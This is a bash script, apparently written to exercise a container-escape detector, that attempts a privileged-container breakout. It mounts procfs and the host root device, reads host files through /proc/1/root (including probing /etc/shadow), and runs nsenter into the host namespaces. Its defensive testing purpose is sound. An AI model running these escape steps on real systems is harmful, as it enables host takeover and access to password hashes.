#!/bin/bash
# ──────────────────────────────────────────────────────────────────
# ATTACK 2 — Privileged Container Mount Escape (REAL)
#
# Technique:  A container running with --privileged has ALL Linux
#             capabilities and access to host /dev devices. It can
#             mount the host filesystem via the host disk device and
#             read/write any host file.
#
# Also attempts:
#   - Mounting host procfs to see host processes
#   - Reading sensitive host files via /proc/1/root
#   - Using nsenter to enter the host PID namespace
#
# What the detector should catch:
#   - mount()  → privileged-container-escape  CRITICAL (CAP_SYS_ADMIN)
#   - setns()  → privileged-container-escape  CRITICAL (CAP_SYS_ADMIN)
#   - openat() on /proc, /sys, /dev → sensitive-host-path-open HIGH
# ──────────────────────────────────────────────────────────────────
set -e

RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
YELLOW='\033[1;33m'
RESET='\033[0m'

echo -e "${RED}"
echo "╔══════════════════════════════════════════════════════════╗"
echo "║  REAL ATTACK 2 — Privileged Container Escape            ║"
echo "║  Running INSIDE a --privileged container                 ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo -e "${RESET}"

echo -e "${CYAN}[INFO]${RESET} PID: $$  UID: $(id -u)  Hostname: $(hostname)"

# ── Check if we have CAP_SYS_ADMIN ────────────────────────────────
echo -e "${CYAN}[INFO]${RESET} Checking capabilities..."
CAP_EFF=$(cat /proc/self/status | grep CapEff | awk '{print $2}')
echo -e "  CapEff: $CAP_EFF"

# Bit 21 = CAP_SYS_ADMIN
CAP_VAL=$((16#$CAP_EFF))
if (( CAP_VAL & (1 << 21) )); then
    echo -e "${GREEN}[VULN]${RESET} CAP_SYS_ADMIN is PRESENT — container is privileged!"
else
    echo -e "${RED}[SAFE]${RESET} CAP_SYS_ADMIN not present — escape will fail"
fi
echo ""

# ── Step 1: Mount a new procfs to see host processes ──────────────
echo -e "${YELLOW}[STEP 1]${RESET} Mounting fresh procfs to /tmp/hostproc..."
mkdir -p /tmp/hostproc
if mount -t proc proc /tmp/hostproc 2>/dev/null; then
    echo -e "${GREEN}[SUCCESS]${RESET} Mounted host procfs"
    echo -e "  Host PID 1: $(cat /tmp/hostproc/1/cmdline 2>/dev/null | tr '\0' ' ')"
    HOST_PROCS=$(ls /tmp/hostproc/ | grep -E '^[0-9]+$' | wc -l)
    echo -e "  Visible host processes: $HOST_PROCS"
    umount /tmp/hostproc 2>/dev/null || true
else
    echo -e "${RED}[BLOCKED]${RESET} mount(proc) failed"
fi
echo ""

# ── Step 2: Access host filesystem via /proc/1/root ───────────────
echo -e "${YELLOW}[STEP 2]${RESET} Reading host files via /proc/1/root (PID namespace escape)..."
if [ -d "/proc/1/root" ]; then
    # Read host hostname
    HOST_HOSTNAME=$(cat /proc/1/root/etc/hostname 2>/dev/null)
    if [ -n "$HOST_HOSTNAME" ]; then
        echo -e "${GREEN}[SUCCESS]${RESET} Host hostname: $HOST_HOSTNAME"
    fi

    # Read host OS release
    HOST_OS=$(cat /proc/1/root/etc/os-release 2>/dev/null | grep PRETTY_NAME | head -1)
    if [ -n "$HOST_OS" ]; then
        echo -e "${GREEN}[SUCCESS]${RESET} Host OS: $HOST_OS"
    fi

    # Try to read /etc/shadow (password hashes)
    if cat /proc/1/root/etc/shadow >/dev/null 2>&1; then
        SHADOW_LINES=$(wc -l < /proc/1/root/etc/shadow 2>/dev/null)
        echo -e "${RED}[ESCAPED]${RESET} Can read host /etc/shadow ($SHADOW_LINES entries)"
    else
        echo -e "${YELLOW}[PARTIAL]${RESET} Cannot read /etc/shadow directly"
    fi
else
    echo -e "${RED}[BLOCKED]${RESET} /proc/1/root not accessible"
fi
echo ""

# ── Step 3: Mount host disk device ────────────────────────────────
echo -e "${YELLOW}[STEP 3]${RESET} Attempting to mount host disk device..."
# Find the root disk device
ROOT_DEV=$(mount | grep ' / ' | head -1 | awk '{print $1}')
echo -e "  Detected root device: $ROOT_DEV"

if [ -b "$ROOT_DEV" ] || [ -e "$ROOT_DEV" ]; then
    mkdir -p /tmp/hostroot
    if mount "$ROOT_DEV" /tmp/hostroot 2>/dev/null; then
        echo -e "${RED}[ESCAPED]${RESET} Mounted host root filesystem!"
        echo -e "  Host /etc/hostname: $(cat /tmp/hostroot/etc/hostname 2>/dev/null)"
        ls /tmp/hostroot/ 2>/dev/null | head -5 | sed 's/^/  /'
        umount /tmp/hostroot 2>/dev/null || true
    else
        echo -e "${YELLOW}[PARTIAL]${RESET} mount failed (device may be in use)"
    fi
else
    echo -e "${YELLOW}[SKIP]${RESET} Root device not directly accessible as block device"
fi
echo ""

# ── Step 4: nsenter into host namespaces ──────────────────────────
echo -e "${YELLOW}[STEP 4]${RESET} Attempting nsenter into host PID 1 namespaces..."
if command -v nsenter >/dev/null 2>&1; then
    RESULT=$(nsenter -t 1 -m -u -i -n -p -- hostname 2>/dev/null)
    if [ -n "$RESULT" ]; then
        echo -e "${RED}[ESCAPED]${RESET} nsenter succeeded! Host hostname: $RESULT"
    else
        echo -e "${RED}[BLOCKED]${RESET} nsenter failed"
    fi
else
    echo -e "${YELLOW}[SKIP]${RESET} nsenter not available in this image"
fi
echo ""

# ── Step 5: Write to host cgroup (test write access) ──────────────
echo -e "${YELLOW}[STEP 5]${RESET} Testing write access to /sys/fs/cgroup..."
if [ -w "/sys/fs/cgroup" ] 2>/dev/null; then
    echo -e "${RED}[VULN]${RESET} /sys/fs/cgroup is writable — cgroup escape possible"
else
    echo -e "${GREEN}[SAFE]${RESET} /sys/fs/cgroup is read-only"
fi
echo ""

echo -e "${RED}"
echo "╔══════════════════════════════════════════════════════════╗"
echo "║  CONCLUSION: Privileged container escape attempted       ║"
echo "║  The detector should have fired CRITICAL alerts for:     ║"
echo "║    - mount() syscalls                                    ║"
echo "║    - setns() syscalls                                    ║"
echo "║    - sensitive host path access (/proc/1/root, /sys)     ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo -e "${RESET}"
